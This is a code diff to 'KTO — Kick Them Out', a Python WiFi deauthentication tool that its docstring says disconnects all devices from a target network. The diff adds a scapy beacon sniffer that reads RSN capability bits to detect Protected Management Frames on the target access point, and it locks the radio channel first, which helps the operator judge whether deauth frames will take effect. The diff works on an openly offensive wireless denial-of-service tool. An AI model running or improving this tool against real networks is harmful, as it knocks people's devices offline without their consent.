@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-KTO — Kick Them Out  v2.1
+KTO — Kick Them Out  v2.1.5
 WiFi deauthentication tool.
 
 Kicks all connected devices from a target network, except whitelisted ones.
@@ -12,7 +12,7 @@ Usage        : sudo python3 kto.py -i wlan0 -t "MyNetwork" [options]
 
 """
 
-VERSION = "2.1"   # keep this in sync with github releases
+VERSION = "2.1.5"   # keep this in sync with github releases
 
 import argparse
 import os
@@ -326,8 +326,6 @@ def set_channel(interface: str, channel: int):
         warn(f"Could not lock channel {channel}: {e.stderr.decode().strip()}")
 
 
-# FIX 1: use iw dev to detect the new monitor interface instead of parsing
-# airmon-ng text output — the text format varies too much across versions
 def _list_monitor_ifaces() -> set:
     try:
         out = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=4).stdout
@@ -523,6 +521,59 @@ class KTO:
         proc.wait()
         return out_base
 
+    # ── RSN / PMF detection via beacon sniff ─────────────────────────────────
+
+    def _beacon_pmf_check(self, bssid: str) -> bool:
+        # airodump CSV auth field only shows SAE/OWE — misses WPA2-PSK+PMF.
+        # this reads the RSN IE caps bits directly from a beacon frame so we
+        # catch PMF regardless of auth type.
+        from scapy.all import Dot11Beacon, Dot11Elt, sniff
+        target = bssid.upper()
+        found  = {"pmf": False}
+
+        def _check(pkt):
+            if not pkt.haslayer(Dot11Beacon):
+                return
+            if not pkt[Dot11].addr2 or pkt[Dot11].addr2.upper() != target:
+                return
+            elt = pkt[Dot11Elt]
+            while elt:
+                if elt.ID == 48 and elt.len >= 4:   # RSN IE
+                    try:
+                        b      = bytes(elt.info)
+                        offset = 2 + 4              # skip version + group cipher
+                        pc     = int.from_bytes(b[offset:offset+2], "little")
+                        offset += 2 + pc * 4        # skip pairwise list
+                        ac     = int.from_bytes(b[offset:offset+2], "little")
+                        offset += 2 + ac * 4        # skip AKM list
+                        if offset + 2 <= len(b):
+                            caps = int.from_bytes(b[offset:offset+2], "little")
+                            if caps & 0x00C0:       # bit6=MFPC, bit7=MFPR
+                                found["pmf"] = True
+                    except Exception:
+                        pass
+                    return
+                try:
+                    elt = elt.payload
+                    if not isinstance(elt, Dot11Elt):
+                        break
+                except Exception:
+                    break
+
+        try:
+            time.sleep(0.3)   # let driver settle on the locked channel first
+            sniff(
+                iface=self.interface,
+                lfilter=lambda p: p.haslayer(Dot11Beacon),
+                prn=_check,
+                stop_filter=lambda p: found["pmf"],
+                timeout=6,
+                store=False,
+            )
+        except Exception:
+            pass
+        return found["pmf"]
+
     # ── Target discovery ─────────────────────────────────────────────────────
 
     # parse the AP section of an airodump CSV and return all matching rows
@@ -620,11 +671,28 @@ class KTO:
         if not self.target_channel:
             self.target_channel = chosen["channel"]
 
+        # lock channel before beacon sniff so we actually hear the AP
+        if self.target_channel:
+            try:
+                subprocess.run(
+                    ["iw", "dev", self.interface, "set", "channel", str(self.target_channel)],
+                    capture_output=True, timeout=5,
+                )
+            except Exception:
+                pass
+
+        # CSV auth field only catches SAE/OWE — misses WPA2-PSK+PMF.
+        # run a beacon sniff to read RSN IE caps bits directly if CSV missed it.
+        if not chosen.get("pmf"):
+            info("Checking RSN IE for PMF (802.11w)…")
+            chosen["pmf"] = self._beacon_pmf_check(chosen["bssid"])
+
         good(
             f"Target  {C.BOLD}{self.ssid}{C.RESET}"
             f"  BSSID {self.target_bssid}"
             f"  ch {self.target_channel}"
             f"  {chosen['privacy']}"
+            + (f"  {C.RED}[PMF]{C.RESET}" if chosen["pmf"] else "")
         )
 
         # PMF warning — deauths will be silently dropped by compliant clients
@@ -632,7 +700,6 @@ class KTO:
             warn(
                 f"{C.YELLOW}{C.BOLD}PMF/MFP detected on this AP.{C.RESET}"
                 f" 802.11w-capable clients will ignore unprotected deauth frames."
-                f" The PoC may have reduced effectiveness against patched clients."
             )
 
         return True
